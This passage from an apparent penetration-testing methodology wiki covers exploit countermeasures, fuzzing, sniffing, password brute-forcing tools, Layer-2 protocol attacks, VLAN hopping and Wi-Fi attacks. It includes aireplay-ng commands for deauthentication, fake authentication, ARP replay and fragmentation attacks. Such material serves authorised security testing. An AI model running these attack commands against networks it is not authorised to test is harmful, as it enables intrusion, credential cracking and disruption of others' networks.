sent into a network in a specified period, or the maximum rate at which the traffic is sent. For these reasons; traffic shaping is important to detect at the network edges to avoid packet dropping and packet marking. Data Loss Prevention (DLP) systems Data Loss Prevention (DLP) refers to systems that identify, monitor, and protect data in use, data in motion, and data at rest via content inspection and contextual analysis of activities (attributes of originator, data object, medium, timing, recipient/destination and so on). DLP systems are analogous to intrusion-prevention system for data. Host based protections Host-based protections usually revolve around an installed software package which monitors a single host for suspicious activity by analyzing events occurring within that host. The majority of Host-based protections utilize one of three detection methods: signature-based, statistical anomaly-based and stateful protocol analysis. Stack/heap protections Numerous tools are available that can monitor the host to provide protections against buffer overflows. Microsoft's Data Execution Prevention mode is an example that is designed to explicitly protect the pointer to the SEH Exception Handler from being overwritten. Whitelisting Whitelisting provides a list of entities that are being provided a particular privilege, service, mobility, access, or recognition. An emerging approach in combating attacks by viruses and malware is to whitelist software which is considered safe to run, blocking all others AV/Filtering/Behavioral Analysis Behavioral analysis works from a set of rules that define a program as either legitimate, or malicious. Behavioral analysis technology monitors what an application or piece of code does and attempts to restrict its action. Examples of this might include applications trying to write to certain parts of a system registry, or writing to pre-defined folders. These and other actions would be blocked, with the actions notified to the user or administrator. Application level protections Exploitation Precision strike Additional information on exploitation can be found at the [ http://www.offensive-security.com/metasploit-unleashed/Exploit_Development Metasploit Unleashed] course. Countermeasure Bypass < Contribution Needed > AV < Contribution Needed > * Encoding * Packing * Whitelist Bypass * Process Injection * Purely Memory Resident Human < Contribution Needed > HIPS < Contribution Needed > DEP < Contribution Needed > ASLR < Contribution Needed > VA + NX (Linux) < Contribution Needed > w ^ x (OpenBSD) < Contribution Needed > WAF A WAF (Web application firewall) is a firewall which can be installed in front of (network topology speaking) a web application. The WAF will analyze each request and look for common web attacks such as Cross Site Scripting and SQLinjection. Like most AV scanners, a blacklisting mechanism is often used to find these potentially malicious HTTP requests (often regex). Since these WAFs are using this blacklisting technique, multiple papers exist on bypassing these types of devices. Stack Canaries In order to understand the use of the Stack Canaries, one needs to understand the fundamental flaw of buffer overflows. A buffer overflow happens when an application fails to properly verify the length of the input received with the length of the buffer in memory to which this data is copied. Due to the way the stack is build, and the way the data is entered on the stack, the input received could be used to overwrite the EIP (extended instruction pointer, this is used by the application to know where the application came from prior to copying the input to the buffer). When an attacker controls the EIP, the execution of the application can be altered in such a way that the attacker has full control of the application. A potential fix is by adding a \"cookie\" or stack canary right after the buffer on the stack. When the application wants to return, the value of the stack canary is verified. If this value has been altered, the program will ignore the EIP and crash therefore making the buffer overflow ineffective. Every operating system calculates a different cookie. Microsoft Windows The cookie in Windows is added by Visual Studio. One of the options when compiling an application is /GS. The option is enabled by default. The cookie is calculated using a few process specific variables. Below is a representative code of how this cookie is calculated. void generate_security_cookie() { int defaultval1 # 0xFFFF0000; int defaultval2 # 0xBB40E64E; // Hex value of PI without comma... int result # 0; int resultcomp # 0; FILETIME filetimestruct ; GetSystemTimeAsFileTime(&filetimestruct); LARGE_INTEGER perfcounter; QueryPerformanceCounter(&perfcounter); int tickc # GetTickCount(); int threadid # GetCurrentThreadId(); int processid # GetCurrentProcessId(); result # result ^ filetimestruct.dwHighDateTime; result # result ^ filetimestruct.dwLowDateTime; result # result ^ threadid; result # result ^ processid; result # result ^ tickc; result # result ^ perfcounter.HighPart; result # result ^ perfcounter.LowPart; if (result ## defaultval2) { printf(\"Wow, what are they odd of getting the same value as the beginning\"); result # 0xBB40E64E; } else { if (!(result & defaultval1)) { int temp # (result | 0x4711) << 16; result |# temp; } } resultcomp # ~result; As you can see, some of these values are not hard to figure out. Except for maybe the LowDateTime and the performance counter. An excellent paper has been written concerning this lack of entropy. More information can be found in that paper here ([ http://j00ru.vexillium.org/?p#690 Exploiting the otherwise non-exploitable]) Linux As in Windows, the somewhat default compiler, gcc, adds the code for the stack canarie. This code can be found in the file libssp/ssp.c static void attribute ((constructor)) __guard_setup (void) { unsigned char *p; int fd; if (__stack_chk_guard !# 0) return; fd # open (\"/dev/urandom\", O_RDONLY); if (fd !# -1) { ssize_t size # read (fd, &__stack_chk_guard, sizeof (__stack_chk_guard)); close (fd); if (size ## sizeof(__stack_chk_guard) && __stack_chk_guard !# 0) return; } /* If a random generator can't be used, the protector switches the guard to the \"terminator canary\". */ p # (unsigned char *) &__stack_chk_guard; p[sizeof(__stack_chk_guard)-1] # 255; p[sizeof(__stack_chk_guard)-2] # '\\n'; p[0] # 0; } It is known that some older versions of gcc do not use the urandom device in order to create a new cookie. They use a preset cookie value (a mix of unprintable characters such as 00 0A 0D and FF). Gcc will compile an application with stack canaries by default. Problems with the implementation on Linux: On a linux machine, there are a few different ways of creating a thread. One of them is called fork(). When using fork to create a new thread, the application will \"quickly\" create a new thread which will reuse the calculated cookie for each new \"fork\"-ed thread. If a buffer overflow would exist in this forked thread, an attacker could bruteforce the stack canarie. Once again a great article describing this attack can be found here ([ http://www.phrack.org/issues.html?issue#67&id#13 Scraps of notes on remote stack overflow exploitation]) MAC OS Disabled by default. Contribution required. Customized Exploitation Fuzzing Fuzzing is the process of attempting to discover security vulnerabilities by sending random input to an application. If the program contains a vulnerability that can leads to an exception, crash or server error (in the case of web apps), it can be determined that a vulnerability has been discovered. Fuzzers are generally good at finding buffer overflow, DoS, SQL Injection, XSS, and Format String bugs. Fuzzing falls into two categories: Dumb Fuzzing and Intelligent Fuzzing. Dumb Fuzzing Dumb Fuzzing usually consists of simple modifications to legitimate data, that is then fed to the target application. In this case, the fuzzer is very easy to write and the idea is to identify low hanging fruit. Although not an elegant approach, dumb fuzzing can produce results, especially when a target application has not been previously tested. FileFuzz is an example of a Dumb Fuzzer. FileFuzz is a Windows based file format fuzzing tool that was designed to automate the launching of applications and detection of exceptions caused by fuzzed file formats. [[:File:Penetration_Testing_Execution_131.png|Screenshot Here]] Intelligent Fuzzing Intelligent Fuzzers are ones that are generally aware of the protocol or format of the data being tested. Some protocols require that the fuzzer maintain state information, such as HTTP or SIP. Other protocols will make use of authentication before a vulnerability is identified. Apart from providing much more code coverage, intelligent fuzzers tend to cut down the fuzzing time significantly since they avoid sending data that the target application will not understand. Intelligent fuzzers are therefore much more targeted and sometimes they need to be developed by the security researcher. Sniffing A packet analyzer is used to intercept and log traffic passing over the network. It is considered best practice to utilize a sniffer when performing exploitation. This ensures that all relevant traffic is captured for further analysis. This is also extremely useful for extracting cleartext passwords. Wireshark Wireshark is a free and open-source packet analyzer. It is used for network troubleshooting, analysis, software and communications protocol development, and education. Originally named Ethereal, in May 2006 the project was renamed Wireshark due to trademark issues. Wireshark is cross-platform, using the GTK + widget toolkit to implement its user interface, and using pcap to capture packets; it runs on various Unix-like operating systems including Linux, Mac OS X, BSD, and Solaris, and on Microsoft Windows. [[:File:Penetration_Testing_Execution_132.png|Screenshot Here]] Tcpdump Tcpdump is a common packet analyzer that runs under the command line. It allows the user to intercept and display TCP/IP and other packets being transmitted or received over a network to which the computer is attached. Tcpdump works on most Unix-like operating systems: Linux, Solaris, BSD, Mac OS X, HP-UX and AIX among others. In those systems, tcpdump uses the libpcap library to capture packets. There is also a port of tcpdump for Windows called WinDump; this uses WinPcap, which is a port of libpcap to Windows. [[:File:Penetration_Testing_Execution_133.png|Screenshot Here]] Brute-Force A brute force attack is a strategy that can in theory be used by an attacker who is unable to take advantage of any weakness in a system. It involves systematically checking all possible usernames and passwords until the correct one is found. Brutus (Windows) Brutus is a generic password guessing tool that comes with built-in routines for attacking HTTP Basic and Forms-based authentication, among other protocols like SMTP and POP3. Brutus can perform both ''dictionary ''and randomly generated attacks from a given character set. [[:File:Penetration_Testing_Execution_134.png|Screenshot Here]] Web Brute (Windows) Web Brute is included with HP WebInspect and is the primary means of attacking a login form or authentication page, using prepared lists of user names and passwords. [[:File:Penetration_Testing_Execution_135.png|Screenshot Here]] THC-Hydra/XHydra THC-Hydra (or just Hydra) is a network logon bruteforcer which supports attacking many different services such as FTP, HTTP, HTTPS, ICQ, IRC, IMAP, LDAP, MS-SQL, MySQL, NCP, NNTP, Oracle, POP3, pcAnywhere, PostgreSQL, REXEC, RDP, RLOGIN, RSH, SAP R/3, SIP, SMB, SMTP, SNMP, SOCKS, SSH, Subversion (SVN), TeamSpeak, Telnet, VNC, VMware Auth Daemon, and XMPP. It is available in both a command line and GUI version. [[:File:Penetration_Testing_Execution_136.png|Screenshot Here]] [[:File:Penetration_Testing_Execution_137.png|Screenshot Here]] Medusa Medus is another network logon bruteforcer which supports attacking many different services such as AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NCP, NNTP, Oracle, POP3, pcAnywhere, PostgreSQL, REXEC, RDP, RLOGIN, RSH, SMB, SMTP, SNMP, SOCKS, SSH, Subversion (SVN), Telnet, VNC, and VMware Auth Daemon. It is only available in a command line version. [[:File:Penetration_Testing_Execution_138.png|Screenshot Here]] Ncrack Ncrack is another network logon bruteforcer which supports attacking many different services such as RDP, SSH, http(s), SMB, pop3(s), FTP, and telnet. Ncrack was designed using a modular approach, a command-line syntax similar to Nmap and a dynamic engine that can adapt its behavior based on network feedback. [[:File:Penetration_Testing_Execution_139.png|Screenshot Here]] Routing protocols Routing protocols specify how routers communicate with each other, disseminating information that enables them to select routes between any two nodes on a computer network, the choice of the route being done by routing algorithms. Each router has a priori knowledge only of networks attached to it directly. A routing protocol shares this information first among immediate neighbors, and then throughout the network. This way, routers gain knowledge of the topology of the network. Cisco Discovery Protocol (CDP) The Cisco Discovery Protocol (CDP) is a proprietary Data Link Layer network protocol developed by Cisco Systems that is implemented in most Cisco networking equipment. It is used to share information about other directly connected Cisco equipment, such as the operating system version and IP address. CDP can also be used for On-Demand Routing, which is a method of including routing information in CDP announcements so that dynamic routing protocols do not need to be used in simple networks. Cisco devices send CDP announcements to the multicast destination address 01:00:0C:CC:CC:CC, out each connected network interface. These multicast packets may be received by Cisco switches and other networking devices that support CDP into their connected network interface. This multicast destination is also used in other Cisco protocols such as VTP. By default, CDP announcements are sent every 60 seconds on interfaces that support Subnetwork Access Protocol (SNAP) headers, including Ethernet, Frame Relay, and Asynchronous Transfer Mode (ATM). Each Cisco device that supports CDP stores the information received from other devices in a table that can be viewed using the show cdp neighbors command. This table is also accessible via snmp. The CDP table information is refreshed each time an announcement is received, and the holdtime for that entry is reinitialized. The holdtime specifies the lifetime of an entry in the table - if no announcements are received from a device for a period in excess of the holdtime, the device information is discarded (default 180 seconds). The information contained in CDP announcements varies by the type of device and the version of the operating system running on it. This information may include the operating system version, hostname, every address (i.e. IP address) from all protocol(s) configured on the port where CDP frame is sent, the port identifier from which the announcement was sent, device type and model, duplex setting, VTP domain, native VLAN, power draw (for Power over Ethernet devices), and other device specific information. The details contained in these announcements are easily extended due to the use of the type-length-value (TLV) frame format. The tool for attacking CDP is Yersinia. [[:File:Penetration_Testing_Execution_140.png|Screenshot Here]] Hot Standby Router Protocol (HSRP) Hot Standby Router Protocol (HSRP) is a Cisco proprietary redundancy protocol for establishing a fault-tolerant default gateway, and has been described in detail in RFC 2281. The Virtual Router Redundancy Protocol (VRRP) is a standards-based alternative to HSRP defined in IETF standard RFC 3768. The two technologies are similar in concept, but not compatible. The protocol establishes a framework between network routers in order to achieve default gateway failover if the primary gateway should become inaccessible, in close association with a rapid-converging routing protocol like EIGRP or OSPF. By multicasting packets, HSRP sends its hello messages to the multicast address 224.0.0.2 (all routers) using UDP port 1985, to other HSRP-enabled routers, defining priority between the routers. The primary router with the highest configured priority will act as a virtual router with a pre-defined gateway IP address and will respond to the ARP request from machines connected to the LAN with the MAC address 0000.0c07.acXX where XX is the group ID in hex. If the primary router should fail, the router with the next-highest priority would take over the gateway IP address and answer ARP requests with the same mac address, thus achieving transparent default gateway fail-over. A HSRP Basics Simulation visualizes Active/Standby election and link failover with Hello, Coup, ARP Reply packets, and timers. HSRP and VRRP are not routing protocols as they do not advertise IP routes or affect the routing table in any way. HSRP and VRRP on some routers have the ability to trigger a failover if one or more interfaces on the router go down. This can be useful for dual branch routers each with a single serial link back to the head end. If the serial link of the primary router goes down, you would want the backup router to take over the primary functionality and thus retain connectivity to the head end. The tool for attacking HSRP is Yersinia. [[:File:Penetration_Testing_Execution_141.png|Screenshot Here]] Virtual Switch Redundancy Protocol (VSRP) The Virtual Switch Redundancy Protocol (VSRP) is a proprietary network resilience protocol developed by Foundry Networks and currently being sold in products manufactured by both Foundry and Hewlett Packard. The protocol differs from many others in use as it combines Layer 2 and Layer 3 resilience - effectively doing the jobs of both Spanning tree protocol and the Virtual Router Redundancy Protocol at the same time. Whilst the restrictions on the physical topologies able to make use of VSRP mean that it is less flexible than STP and VRRP it does significantly improve on the failover times provided by either of those protocols. Dynamic Trunking Protocol (DTP) The Dynamic Trunking Protocol (DTP) is a proprietary networking protocol developed by Cisco Systems for the purpose of negotiating trunking on a link between two VLAN-aware switches, and for negotiating the type of trunking encapsulation to be used. It works on the Layer 2 of the OSI model. VLAN trunks formed using DTP may utilize either IEEE 802.1Q or Cisco ISL trunking protocols. DTP should not be confused with VTP, as they serve different purposes. VTP communicates VLAN existence information between switches. DTP aids with trunk port establishment. Neither protocol transmits the data frames that trunks carry. The tool for attacking DTP is Yersinia. [[:File:Penetration_Testing_Execution_142.png|Screenshot Here]] Spanning Tree Protocol (STP) The Spanning Tree Protocol (STP) is a network protocol that ensures a loop-free topology for any bridged Ethernet local area network. The basic function of STP is to prevent bridge loops and ensuing broadcast radiation. Spanning tree also allows a network design to include spare (redundant) links to provide automatic backup paths if an active link fails, without the danger of bridge loops, or the need for manual enabling/disabling of these backup links. STP is a Data Link Layer protocol. It is standardized as IEEE 802.1D. As the name suggests, it creates a spanning tree within a mesh network of connected layer-2 bridges (typically Ethernet switches), and disables those links that are not part of the spanning tree, leaving a single active path between any two network nodes. The tool for attacking STP is Yersinia. [[:File:Penetration_Testing_Execution_143.png|Screenshot Here]] Open Shortest Path First (OSPF) Open Shortest Path First (OSPF) is an adaptive routing protocol for Internet Protocol (IP) networks. It uses a link state routing algorithm and falls into the group of interior routing protocols, operating within a single autonomous system (AS). It is defined as OSPF Version 2 in RFC 2328 (1998) for IPv4. The updates for IPv6 are specified as OSPF Version 3 in RFC 5340 (2008). RIP RIP is a dynamic routing protocol used in local and wide area networks. As such it is classified as an interior gateway protocol (IGP). It uses the distance-vector routing algorithm. It was first defined in RFC 1058 (1988). The protocol has since been extended several times, resulting in RIP Version 2 (RFC 2453). Both versions are still in use today, although they are considered to have been made technically obsolete by more advanced techniques such as Open Shortest Path First (OSPF) and the OSI protocol IS-IS. RIP has also been adapted for use in IPv6 networks, a standard known as RIPng (RIP next generation) protocol, published in RFC 2080 (1997). VLAN Hopping VLAN hopping (virtual local area network hopping) is a computer security exploit, a method of attacking networked file_suport on a VLAN. The basic concept behind all VLAN hopping attacks is for an attacking host on a VLAN to gain access to traffic on other VLANs that would normally not be accessible. There are two primary methods of VLAN hopping: switch spoofing and double tagging. In a switch spoofing attack, an attacking host that is capable of speaking the tagging and trunking protocols used in maintaining a VLAN imitates a trunking switch. Traffic for multiple VLANs is then accessible to the attacking host. In a double tagging attack, an attacking host prepends two VLAN tags to packets that it transmits. The first header (which corresponds to the VLAN that the attacker is really a member of) is stripped off by a first switch the packet encounters, and the packet is then forwarded. The second, false, header is then visible to the second switch that the packet encounters. This false VLAN header indicates that the packet is destined for a host on a second, target VLAN. The packet is then sent to the target host as though it were layer 2 traffic. By this method, the attacking host can bypass layer 3 security measures that are used to logically isolate hosts from one another. The tool for attacking 802.1q is Yersinia. [[:File:Penetration_Testing_Execution_144.png|Screenshot Here]] VLAN Trunking Protocol (VTP) VLAN Trunking Protocol (VTP) is a Cisco proprietary Layer 2 messaging protocol that manages the addition, deletion, and renaming of Virtual Local Area Networks (VLAN) on a network-wide basis. Cisco's VLAN Trunk Protocol reduces administration in a switched network. When a new VLAN is configured on one VTP server, the VLAN is distributed through all switches in the domain. This reduces the need to configure the same VLAN everywhere. To do this, VTP carries VLAN information to all the switches in a VTP domain. VTP advertisements can be sent over ISL, 802.1q, IEEE 802.10 and LANE trunks. VTP is available on most of the Cisco Catalyst Family products. The tool for attacking VTP is Yersinia. [[:File:Penetration_Testing_Execution_145.png|Screenshot Here]] RF Access The goal of the earlier phases is to gather every possible piece of information about the Radio Frequencies in use that can be leveraged during this phase. Unencrypted Wireless LAN It is possible to actually connect to an unencrypted Wireless LAN (WLAN). To connect to an unencrypted WLAN, you simply have to either issue appropriate commands or use a GUI interface to connect. Iwconfig (Linux) The following commands to connect up to the ESSID. To ensure that the wireless interface is down, issue the following: ifconfig < interface > down Force dhclient to release any currently assigned DHCP addresses with the following command: dhclient -r < interface > Bring the interface back up with the following command: ifconfig < interface > up Iwconfig is similar to ifconfig, but is dedicated to the wireless interfaces. It is used to set the parameters of the network interface which are specific to the wireless operation. To assign set the ESSID (or Network Name to the wireless interface, use the following command: iwconfig < interface > essid \"ESSID_IN_QUOTES\" Next we need to set the operating mode of the device, which depends on the network topology. Setting this to ''Managed'' means that we are connecting to a network that is composed of access points. iwconfig < interface > mode Managed Use dhclient to obtain a DHCP addresses with the following command: dhclient < interface > At this point we should receive an IP address and be connected to the client's wireless network. Ensure that adequate screen shots are taken to definitively indicate the ability to connect, receive an IP address, and traverse the network. Windows (XP/7) Based upon the wireless network adapter installed, Windows will provide you with a mechanism to connect to wireless networks. The version of Windows utilized will dictate the process. For this reason we are covering Windows XP and 7. [[:File:Penetration_Testing_Execution_146.png|Screenshot Here]] Windows XP will show an icon with a notification that says it has found wireless networks. [[:File:Penetration_Testing_Execution_147.png|Screenshot Here]] Right-click the wireless network icon in the lower right corner of your screen, and then click \"View Available Wireless Networks.\" [[:File:Penetration_Testing_Execution_148.png|Screenshot Here]] The Wireless Network Connection window appears and displays your wireless network listed with the SSID you chose. If you don't see your network, click Refresh network list in the upper left corner. Click your network, and then click Connect in the lower right corner. Windows 7 offers the same ability to connect to wireless networks. On the right side of the taskbar, you will see a wireless network icon like the one below. Click on it. [[:File:Penetration_Testing_Execution_149.png|Screenshot Here]] A window with available network connections will open. As you can see from the screenshot below, the list is split by the type of available network connections. At the top you have [ http://en.wikipedia.org/wiki/Dial-up dial-up] and [ http://en.wikipedia.org/wiki/VPN virtual private network (VPN)] connections, while at the bottom you have a list of all the wireless networks which Windows 7 has detected. To refresh the list of available networks, click on the button highlighted in the screenshot below. [[:File:Penetration_Testing_Execution_150.png|Screenshot Here]] You can scroll down through the list of available networks. Once you decided on which network to connect to, click on it. Next, click on the ''Connect'' button. [[:File:Penetration_Testing_Execution_151.png|Screenshot Here]] If everything is OK, Windows 7 will connect to the network you selected using the given security key. Attacking the Access Point All identified access points are vulnerable to numerous attacks. For completeness, we've included some attack methods that may not be a part of all engagements. Ensure that the scoping is reviewed prior to initiating any attacks. Denial of Service (DoS) Within the standard, there are two packets that help in this regard, the ''Clear To Send (CTS)'' and ''Request To Send (RTS)'' packets. Devices use RTS packets when they have something big to send, and they don't want other devices to step on their transmission. CTS packets are sent so that the device knows it's okay to transmit. Every device (other than the one that sent the RTS) within the range of the CTS packet cannot transmit anything for the duration specified. The first technique is to transmit the CTS packets, meaning that anyone in range of your signal will be unable to transmit. This requires a high-gain Omni-directional antenna to a much greater impact. The second technique is to send an RTS packet to the AP you are targeting. Once the AP gets the RTS packet, it will send the CTS. A highly directional antenna from a distance can be used to target the AP with an RTS packet. Generally speaking, transmitting the CTS has a greater impact. Cracking Passwords WPA-PSK/ WPA2-PSK WPA-PSK is vulnerable to brute force attack. Tools like Aircrack and coWPAtty take advantage of this weakness and provided a way to test keys against dictionaries. The problem is that it's a very slow process. Precomputational attacks are limited as the BSSID and the BSSID length are seeded into the passphrase hash. This is why WPA-PSK attacks are generally limited due by time. There is no difference between cracking WPA or WPA2, the authentication is essentially the same. The main requirement for any WPA/WPA2 is to capture the authentication handshake and then use Aircrack-ng to crack the pre-shared key. This can be done either actively or passively. \"Actively\" means you will accelerate the process by deauthenticating an existing wireless client. \"Passively\" means you simply wait for a wireless client to authenticate to the WPA/WPA2 network. WPA/WPA2-Enterprise In environments with a large number of users, such as corporations or universities, WPA/WPA2 pre-shared key management is not feasible. For example, it wouldn't be possible to track which users are connected and it would be impossible to revoke access to the network for individuals without changing the key for everyone. Therefore WPA2 Enterprise authenticates users against a user database (RADIUS). Two common methods to do that are WPA2-EAP-TTLS and WPA2-PEAP. Attacks LEAP This stands for the Lightweight Extensible Authentication Protocol. This protocol is based on 802.1X and helps minimize the original security flaws by using WEP and a sophisticated key management system. This EAP-version is safer than EAP-MD5. This also uses MAC address authentication. LEAP is not safe against crackers. THC-LeapCracker can be used to break Cisco's version of LEAP and be used against computers connected to an access point in the form of a dictionary attack. Anwrap and asleap are other crackers capable of breaking LEAP. Asleap Asleap is a designed specifically to recover weak LEAP (Cisco's Lightweight Extensible Authentication Protocol) and PPTP passwords. Asleap performs Weak LEAP and PPTP password recovery from pcap and AiroPeek files or from live capture. Finally, it has the ability to deauthenticate clients on a leap WLAN (speeding up leap password recovery). [[:File:Penetration_Testing_Execution_152.png|Screenshot Here]] The first step involved in the use of asleap is to produce the necessary database (.dat) and index files (.idx) using genkeys from the supplied (-r) a dictionary (wordlist) file. [[:File:Penetration_Testing_Execution_153.png|Screenshot Here]] The final step in recovering the weak LEAP password is to run the asleap command with our newly created .dat and .idx files: [[:File:Penetration_Testing_Execution_154.png|Screenshot Here]] 802.1X 802.1X is an IEEE Standard for port-based Network Access Control (PNAC). It is part of the IEEE 802.1 group of networking protocols. It provides an authentication mechanism to devices wishing to attach to a LAN or WLAN. IEEE 802.1X defines the encapsulation of the Extensible Authentication Protocol (EAP) over IEEE 802 which is known as \"EAP over LAN\" or EAPOL. There are two main attacks which can be used against 802.1X: Key Distribution Attack The key distribution attack exploits a weakness in the RADIUS protocol. The key distribution attack relies on an attacker capturing the PMK transmission between the RADIUS server and the AP. As the PMK is transmitted outside of the TLS tunnel, its protection is solely reliant on the RADIUS server's HMAC-MD5 hashing algorithm. Should an attacker be able to leverage a man-in-the-middle attack between the AP and RADIUS sever, a brute-force attempt could be made to crack the RADIUS shared secret. This would ultimately provide the attacker with access to the PMK - allowing full decryption of all traffic between the AP and supplicant. RADIUS Impersonation Attack The RADIUS impersonation attack relies on users being left with the decision to trust or reject certificates from the authenticator. Attackers can exploit this deployment weakness by impersonating the target network's AP service set identifier (SSID) and RADIUS server. Once both the RADIUS server and AP have been impersonated the attacker can issue a 'fake' certificate to the authenticating user. After the certificate has been accepted by the user the client will proceed to authenticate via the inner authentication mechanism. This allows the attacker to capture the MSCHAPv2 challenge/response and attempt to crack it offline. PEAP The Protected Extensible Authentication Protocol (Protected EAP or PEAP) is a protocol that encapsulates the Extensible Authentication Protocol (EAP) within an encrypted and authenticated Transport Layer Security (TLS) tunnel. The purpose was to correct deficiencies in EAP; EAP assumed a protected communication channel, such as that provided by physical security, so facilities for protection of the EAP conversation were not provided. RADIUS Impersonation Attack The RADIUS impersonation attack relies on users being left with the decision to trust or reject certificates from the authenticator. Attackers can exploit this deployment weakness by impersonating the target network's AP service set identifier (SSID) and RADIUS server. Once both the RADIUS server and AP have been impersonated the attacker can issue a 'fake' certificate to the authenticating user. After the certificate has been accepted by the user the client will proceed to authenticate via the inner authentication mechanism. This allows the attacker to capture the MSCHAPv2 challenge/response and attempt to crack it offline. Authentication Attack The PEAP authentication attack is a primitive means of gaining unauthorized access to PEAP networks. By sniffing usernames from the initial (unprotected) PEAP identity exchange an attacker can attempt to authenticate to the target network by 'guessing' user passwords. This attack is often ineffective as the authenticator will silently ignores bad login attempts ensuring a several second delay exists between login attempts. EAP-Fast EAP-FAST (Flexible Authentication via Secure Tunneling) is Cisco's replacement for LEAP. The protocol was designed to address the weaknesses of LEAP while preserving the \"lightweight\" implementation. EAP-FAST uses a Protected Access Credential (PAC) to establish a TLS tunnel in which client credentials are verified. EAP-FAST provides better protection against dictionary attacks, but is vulnerable to MITM attacks. Since many implementations of EAP-FAST leave anonymous provisioning enabled, AP impersonation can reveal weak credential exchanges. WEP/WPA/WPA2 The core process of connecting to a WEP encrypted network revolves around obtaining the WEP key for the purpose of connecting to the network. There are several tools that can be used to perform attacks against WEP. Aircrack-ng Aircrack-ng is an 802.11 WEP and WPA-PSK keys cracking program that can recover keys once enough data packets have been captured. It implements the standard FMS attack along with some optimizations like KoreK attacks, as well as the all-new PTW attack, thus making the attack much faster compared to other WEP cracking tools. The first step is to place the wireless interface in monitor mode by entering: airmon-ng start wlan0 '''Airmon-ng''' Airmon-ng is used to enable monitor mode on wireless interfaces. It may also be used to go back from monitor mode to managed mode. Entering the airmon-ng command without parameters will show the interfaces status. To start wlan0 in monitor mode: airmon-ng start wlan0 To start wlan0 in monitor mode on channel 8: airmon-ng start wlan0 8 To stop wlan0: airmon-ng stop wlan0 To check the status: airmon-ng [[:File:Penetration_Testing_Execution_155.png|Screenshot Here]] Enter \"iwconfig\" to validate the wireless interfaces. The output should look similar to: [[:File:Penetration_Testing_Execution_156.png|Screenshot Here]] '''Airodump-ng''' Airodump-ng is used for packet capturing of raw 802.11 frames and is particularly suitable for collecting WEP IVs (Initialization Vector) for the intent of using them with Aircrack-ng. If you have a GPS receiver connected to the computer, Airodump-ng is capable of logging the coordinates of the found access points. Usage: airodump-ng < options > < interface >[ , < interface > ,... ] Options: --ivs : Save only captured IVs --gpsd : Use GPSd --write < prefix > : Dump file prefix -w : same as --write --beacons : Record all beacons in dump file --update < secs > : Display update delay in seconds --showack : Prints ack/cts/rts statistics -h : Hides known stations for --showack -f < msecs > : Time in ms between hopping channels --berlin < secs > : Time before removing the AP/client from the screen when no more packets are received (Default: 120 seconds) -r < file > : Read packets from that file -x < msecs > : Active Scanning Simulation --output-format < formats > : Output format. Possible values: pcap, ivs, csv, gps, kismet, netxml Short format \"-o\" The option can be specified multiple times. In this case, each file format specified will be output. Only ivs or pcap can be used, not both. [[:File:Penetration_Testing_Execution_157.png|Screenshot Here]] [[:File:Penetration_Testing_Execution_158.png|Screenshot Here]] '''Aireplay-ng''' Aireplay-ng is primarily used to generate or accelerate traffic for the later use with Aircrack-ng (for cracking WEP keys). Aireplay-ng supports various attacks such as deauthentication, fake authentication, Interactive packet replay, hand-crafted ARP request injection and ARP-request re injection. Usage: aireplay-ng < options > < replay interface > These are the attack names and their corresponding \"numbers\": '''Attack 0: '''Deauthentication '''Attack 1: '''Fake authentication '''Attack 2: '''Interactive packet replay '''Attack 3: '''ARP request replay attack '''Attack 4: '''KoreK chopchop attack '''Attack 5: '''Fragmentation attack '''Attack 9: '''Injection test Note: Not all options apply to all attacks. '''Attack 0 - Deauthentication''' A deauthentication attack sends disassociation packets to one or more clients who are currently associated with an AP. Disassociating clients can reveal a hidden / cloaked ESSID. Deauthentication attacks also provide an ability to capture WPA/WPA2 handshakes by forcing clients to re-authenticate. aireplay-ng -0 1 -a 34:EF:44:BB:14:C1 -c 00:E0:4C:6D:27:8D wlan0 -0 means deauthentication 1 is the number of deauths to send (you can send multiple if you wish); 0 means send them continuously -a 34:EF:44:BB:14:C1 is the MAC address of the access point -c 00:E0:4C:6D:27:8D is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated wlan0 is the interface name [[:File:Penetration_Testing_Execution_159.png|Screenshot Here]] '''Attack 1 - Fake authentication''' The fake authentication attack allows you to perform the two types of WEP authentication (Open System and Shared Key) and to associate with an AP. This attack is useful in scenarios where there are no associated clients. Note that fake authentication attacks do not generate ARP packets. aireplay-ng -1 0 -e 2WIRE696 -a 34:EF:44:BB:14:C1 -h 00:E0:4C:6D:27:8D wlan0 -1 means fake authentication 0 reassociation timing in seconds -e 2WIRE696 is the wireless network name -a 34:EF:44:BB:14:C1 is the access point MAC address -h 00:E0:4C:6D:27:8D is our card MAC address wlan0 is the wireless interface name [[:File:Penetration_Testing_Execution_160.png|Screenshot Here]] '''Attack 3 - ARP Request Replay Attack''' The classic ARP request replay attack is the most effective way to generate new initialization vectors. This attack is probably the most reliable of all. The program listens for an ARP packet then retransmits it back to the AP. This, in turn causes the AP to repeat the ARP packet with a new IV. The program retransmits the same ARP packet over and over. However, each ARP packet repeated by the AP has a new IV. The collection of these IVs will later help us later in determining the WEP key. aireplay-ng -3 -b 34:EF:44:BB:14:C1 -h 00:E0:4C:6D:27:8D wlan0 -3 means standard arp request replay -b 34:EF:44:BB:14:C1 is the access point MAC address -h 00:E0:4C:6D:27:8D is the source MAC address (either an associated client or from fake authentication) wlan0 is the wireless interface name '''Attack 4 - KoreK chopchop''' The KoreK chopchop attack can decrypt a WEP data packet without knowing the key. It can even work against dynamic WEP. ''This attack does not recover the WEP key itself, it merely reveals the plaintext''. Some APs are not vulnerable to this attack. They may seem vulnerable at first but actually drop data packets shorter than 60 bytes. If the AP drops packets shorter than 42 bytes, Aireplay tries to guess the rest of the missing data, as far as the headers are predictable. If an IP packet is captured Aireplay checks if the checksum of the header is correct after guessing its missing parts. Remember that this attack requires at least one WEP data packet. aireplay-ng -4 -b 34:EF:44:BB:14:C1 -h 00:E0:4C:6D:27:8D wlan0 -4 means the chopchop attack -b 34:EF:44:BB:14:C1 is the access point MAC address -h 00:E0:4C:6D:27:8D is the source MAC address (either an associated client or from fake authentication) wlan0 is the wireless interface name '''Attack 5 - Fragmentation Attack''' The fragmentation attack does not recover the WEP key itself, but (also) obtains the PRGA (pseudo random generation algorithm) of the packet. The PRGA can then be used to generate packets with Packetforge-ng which are in turn are used for various injection attacks. The attack requires at least one data packet to be received from the AP in order to initiate the attack. Basically, the program obtains a small amount of keying material from the packet then attempts to send ARP and/or LLC packets with known content to the AP. If the packet is successfully echoed back by the AP then a larger amount of keying information can be obtained from the returned packet. This cycle is repeated several times until 1500 bytes of PRGA are obtained (sometimes less than 1500 bytes). aireplay-ng -5 -b 34:EF:44:BB:14:C1 -h 